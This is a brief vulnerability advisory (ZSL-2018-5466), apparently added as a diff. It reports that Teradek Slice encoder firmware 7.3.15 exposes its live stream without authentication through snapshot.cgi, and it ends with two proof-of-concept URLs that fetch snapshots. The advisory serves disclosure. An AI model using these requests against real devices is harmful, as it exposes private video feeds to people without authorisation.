@@ -1,0 +1,36 @@
+
+Teradek Slice 7.3.15 (snapshot.cgi) Stream Disclosure
+
+
+Vendor: Teradek, LLC
+Product web page: https://www.teradek.com
+Affected version: Firmware Version:7.3.15 (build 31735)
+                  Hardware Version: 2.1
+
+
+Summary: Built on the award-winning Cube platform, Slice is a rack mount
+HEVC / H.264 codec designed to fit seamlessly into your broadcast studio.
+Like the Cube, Slice encoders and decoders includes 3G-SDI and HDMI I/O,
+Ethernet and WiFi connectivity, and full duplex IFB.
+
+Desc: Slice suffers from an unauthenticated and unauthorized live stream
+disclosure when snapshot.cgi script is called.
+
+Tested on: lighttpd/1.4.31
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2018-5466
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5466.php
+
+
+02.03.2018
+
+--
+
+
+http://127.0.0.1:8089/cgi-bin/snapshot.cgi  <-- Generate new and view (redirects to /snapshot.jpg)
+http://127.0.0.1:8089/snapshot.jpg          <-- View stored
